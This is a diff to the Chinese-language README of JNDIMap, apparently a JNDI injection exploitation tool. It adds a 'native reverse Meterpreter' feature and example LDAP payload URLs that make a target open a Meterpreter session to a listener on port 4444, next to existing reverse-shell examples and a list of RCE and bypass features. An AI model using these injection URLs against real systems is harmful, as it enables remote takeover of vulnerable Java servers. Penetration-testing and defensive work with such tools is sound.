@@ -9,6 +9,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI, LDAP 和 LDAPS 协议, �
 - DNS Log
 - 命令执行
 - 原生反弹 Shell (支持 Windows)
+- 原生反弹 Meterpreter
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml/MVEL Bypass
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
@@ -93,6 +94,10 @@ ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file
 # 原生反弹 Shell (支持 Windows)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
+
+# 原生反弹 Meterpreter (java/meterpreter/reverse_tcp)
+ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
+ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
 ### Bypass
